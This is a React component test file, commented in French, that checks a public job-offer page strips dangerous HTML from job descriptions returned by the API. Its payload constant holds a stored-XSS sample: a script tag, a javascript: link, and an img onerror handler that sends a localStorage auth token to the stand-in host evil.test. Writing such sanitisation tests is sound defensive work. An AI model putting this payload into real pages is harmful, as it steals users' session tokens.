import { describe, expect, it, vi } from "vitest";
import { screen } from "@testing-library/react";

import { PublicJobView } from "@/features/job-offer/public-job-view";
import type { PublicJob } from "@/types/public-job";
import { renderWithQueryClient } from "@/tests/helpers/test-utils";

// Axios simulé (et non le module API) : la re-sanitisation de la couche API
// est réellement exécutée — c'est elle qui protège le DOM.
vi.mock("@/lib/api/axios", () => ({
  api: { get: vi.fn(), post: vi.fn(), put: vi.fn(), defaults: { baseURL: "http://api.test" } },
}));

import { api } from "@/lib/api/axios";

const getMock = vi.mocked(api.get);

const PUBLIC_ID = "abcdefghijkl";

/** Charge utile XSS stocké : script, image avec onerror, lien javascript:, onclick. */
const HOSTILE_DESCRIPTION =
  "<p>Legit text</p>" +
  "<script>alert(document.cookie)</script>" +
  '<img src=x onerror="fetch(\'//evil.test/\'+localStorage.getItem(\'linqorbit.auth\'))">' +
  '<a href="javascript:alert(1)">link</a>' +
  '<p onclick="steal()">click</p>';

function publicJob(description: string | null): PublicJob {
  return {
    publicId: PUBLIC_ID,
    slug: "backend-engineer",
    title: "Backend Engineer",
    description,
    seniority: "mid",
    requiredExpYear: 3,
    city: "Paris",
    country: "FR",
    companyName: "Nimbus Labs",
    contractType: "Permanent",
    employmentType: "Full-time",
    workMode: "Remote",
    salaryMin: 50000,
    salaryMax: 70000,
    salaryCurrency: "EUR",
    salaryPeriod: "year",
    expiresAt: null,
    skills: [],
    languages: [],
    degreeLabels: [],
    studyFieldLabels: [],
    publishedAt: "2026-10-01T10:00:00",
  };
}

function mockPublicJob(description: string | null) {
  getMock.mockImplementation((url: string) => {
    if (url.includes("/related")) {
      return Promise.resolve({ data: [] });
    }
    return Promise.resolve({ data: publicJob(description) });
  });
}

describe("fiche publique — re-sanitisation à la lecture (D108)", () => {
  it("n'injecte aucun HTML actif quand la réponse de l'API est hostile", async () => {
    mockPublicJob(HOSTILE_DESCRIPTION);

    const { container } = renderWithQueryClient(
      <PublicJobView jobParam={`${PUBLIC_ID}-backend-engineer`} />,
    );

    await screen.findByRole("region", { name: "Job overview" });

    // La fiche est publique (sans authentification) et rend la description en
    // HTML : rien d'actif ne doit atteindre le DOM.
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("onclick");
    expect(container.innerHTML).not.toContain("javascript:");
    expect(container.innerHTML).not.toContain("localStorage");

    // Le texte utile est conservé : la sanitisation n'est pas un effacement.
    expect(screen.getByText("Legit text")).toBeInTheDocument();
    expect(screen.getByText("click")).toBeInTheDocument();
  });

  it("rend la description légitime telle quelle", async () => {
    mockPublicJob("<h2>What you will do</h2><p>Build our platform APIs.</p>");

    renderWithQueryClient(<PublicJobView jobParam={`${PUBLIC_ID}-backend-engineer`} />);

    await screen.findByRole("region", { name: "Job overview" });

    expect(screen.getByRole("heading", { name: "What you will do" })).toBeInTheDocument();
    expect(screen.getByText("Build our platform APIs.")).toBeInTheDocument();
  });

  it("n'affiche aucune description quand la réponse est vide", async () => {
    mockPublicJob(null);

    renderWithQueryClient(<PublicJobView jobParam={`${PUBLIC_ID}-backend-engineer`} />);

    await screen.findByRole("region", { name: "Job overview" });

    expect(screen.queryByRole("heading", { name: "About the role" })).not.toBeInTheDocument();
  });
});
